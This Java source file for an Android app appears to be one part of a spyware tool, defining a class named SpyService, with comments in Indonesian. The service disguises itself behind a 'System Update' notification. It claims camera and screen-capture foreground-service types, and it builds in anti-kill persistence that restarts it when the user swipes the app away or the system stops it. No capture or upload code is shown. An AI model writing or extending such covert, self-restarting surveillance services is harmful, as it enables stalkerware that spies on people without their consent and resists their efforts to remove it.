package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class SpyService extends Service {
    private static final String CHANNEL_ID = "SpyServiceChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        // Memasang ikon ic_launcher di samping baterai agar layanan tetap aktif
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Processing...")
                .setSmallIcon(R.mipmap.ic_launcher) // Menggunakan resource mipmap ic_launcher
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true) // Menjamin notifikasi tidak bisa dihapus oleh user
                .build();

        // Penanganan Android 14+ (API 34) untuk menghindari Force Close pada Foreground Service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Sirkuit Anti-Kill: Memaksa OS menghidupkan kembali service jika di-kill
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Auto-restart service saat user mencoba menutup aplikasi dari Recent Apps
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        // Jalur darurat restart via RestarterReceiver jika service hancur
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("RestartSpyService");
        broadcastIntent.setClass(this, RestarterReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();
    }
}